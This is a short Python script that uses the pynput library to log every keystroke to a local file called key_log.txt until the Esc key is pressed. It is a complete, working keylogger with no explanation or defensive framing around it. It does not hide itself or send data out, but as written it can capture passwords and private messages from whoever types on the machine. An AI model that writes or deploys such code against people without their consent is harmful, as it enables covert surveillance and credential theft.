from pynput.keyboard import Key, Listener

# File where keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(' ')
            else:
                f.write(f' {str(key)} ')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
